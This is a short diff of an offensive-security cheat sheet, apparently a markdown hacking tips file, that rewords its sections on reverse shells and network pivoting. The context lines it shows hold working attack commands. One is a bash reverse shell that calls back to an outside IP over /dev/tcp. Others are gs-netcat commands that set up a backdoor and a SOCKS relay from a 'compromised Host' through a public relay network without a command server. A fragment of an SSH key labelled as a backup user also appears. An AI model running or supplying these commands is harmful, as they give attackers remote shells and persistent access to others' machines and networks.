@@ -325,7 +325,7 @@ Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/
 <a id="rswg-anchor"></a>
 **5.i.a. Reverse shell with gs-netcat**
 
-Install [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functional PTY reverse shell without the need of a Command & Controll server. If netcat is the equivalent to a swiss army knife than gs-netcat is a german battle axe.
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. This means you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is the equivalent to a swiss army knife than gs-netcat is a german battle axe :>
 
 ```
 $ ./gs-netcat -s MySecret -l -i    # Host
@@ -354,7 +354,7 @@ $ setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1 &
 <a id="rswob-anchor"></a>
 **5.i.c. Reverse shell without Bash**
 
-Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
+Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
 On the remote system:
 
@@ -498,7 +498,7 @@ c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
 <a id="bdra-anchor"></a>
 **6.iii. Remote Access to an entire network**
 
-Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the global socket relay network without the need of a Command & Control server (e.g. directly from your workstation):
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). It creates a SOCKS relay on the Host's private lan which is accessible through the Global Relay network without the need to run your own server (e.g. directly from your workstation):
 
 ```
 $ gs-netcat -l -S       # compromised Host
